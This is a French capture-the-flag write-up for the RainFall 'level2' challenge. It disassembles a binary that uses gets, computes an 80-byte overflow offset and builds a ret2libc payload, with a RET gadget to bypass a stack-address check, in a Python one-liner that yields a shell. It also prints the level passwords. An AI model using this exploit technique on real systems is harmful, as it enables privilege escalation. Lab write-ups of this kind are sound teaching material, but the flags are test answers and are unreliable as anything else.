On se connecte sur le level2, ou se trouve un **binaire** <code>level2</code>.

On cherche a savoir ce que fait ce binaire:
```gdb
> gdb level2 -q
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) > disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.
> disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp
   0x080484da <+6>:     mov    0x8049860,%eax
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
   0x08048507 <+51>:    mov    $0x8048620,%eax
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
End of assembler dump.
```

En traduisant le programme (dans **source.c**) on se rend compte de l'utilisation de la fonction **gets** (vulnerable) mais aussi d' une restriction sur l'adresse de retour sur la stack:
<pre><code>if (0xb0000000 == (address & 0xb0000000))
</code></pre>
ou
```gdb
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
```

Nous allons donc faire un **buffer overflow** avec **rettolibc**, et nous allons utliser un **RET** afin de bypasser la restriction.

On calcul l'**offset** qui va nous permettre de faire le **buffer overflow**:
```gdb
> gdb -q level2
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) > b *p+30 # Adresse juste apres le gets
(gdb) > run
Starting program: /home/user/level2/level2
AAAAAAAAAAAAA

Breakpoint 1, 0x080484f2 in p ()
> (gdb) x/10x $eax
0xbffff6bc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6cc:     0xb7fd0f00      0x08048550      0x08049828      0x00000001
0xbffff6dc:     0x08048381      0xb7fd13e4

> (gdb) i f
Stack level 0, frame at 0xbffff710:
 eip = 0x80484f2 in p; saved eip 0x804854a
 called by frame at 0xbffff720
 Arglist at 0xbffff708, args:
 Locals at 0xbffff708, Previous frame's sp is 0xbffff710
 Saved registers:
  ebp at 0xbffff708, eip at 0xbffff70c
 
> (gdb) p 0xbffff70c - 0xbffff6bc
$1 = 80

> p *system
$3 = {<text variable, no debug info>} 0xb7e6b060 <system>
```
> OFFSET : 80
> SYSTEM: <code>0xb7e6b060</code>
> RET: <code>0x0804853e</code>
> EXIT: <code>0xb7e5ebe0</code>



Pour récupéré l'adresse de /bin/sh, on écrit un petit programme en C dans /tmp.

```bash
> touch /tmp/getsh.c
> echo "#include <stdio.h>
#include <stdlib.h>
int main(){ printf(\"SHELL= %p\n\", getenv(\"SHELL\")); return 0; }" > /tmp/getsh.c
> cd /tmp
> gcc getsh.c
> ./a.out
SHELL= 0xbffff945
```

On change l'environement du shell pour passer sur **/bin/sh** car **bash** garde les privilèges de l'utilisateur qui l'invoque.
On execute ensuite le programme avec notre buffer overflow suivi d'une addresse de ret, d'une addresse système, de l'addresse d'un exit et de l'addresse du **/bin/sh**.
Si l'addresse est légèrement décaler (in/sh par exemple), il suffit de modifier légèrement l'addresse pour obtenir **/bin/sh**.

```bash
> SHELL=/bin/sh
level2@RainFall:~$ (python -c "print 'A' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7'+ '\x45\xf9\xff\xbf'"; cat) | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>`E
sh: 1: in/sh: Permission denied
^C`
level2@RainFall:~$ (python -c "print 'A' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7'+ '\x43\xf9\xff\xbf'"; cat) | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>`C`
cd ../level3 && cat .pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

For download :
<pre><code>scp -P4242 level2@192.168.1.78:level2 .</code></pre>
> Password : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
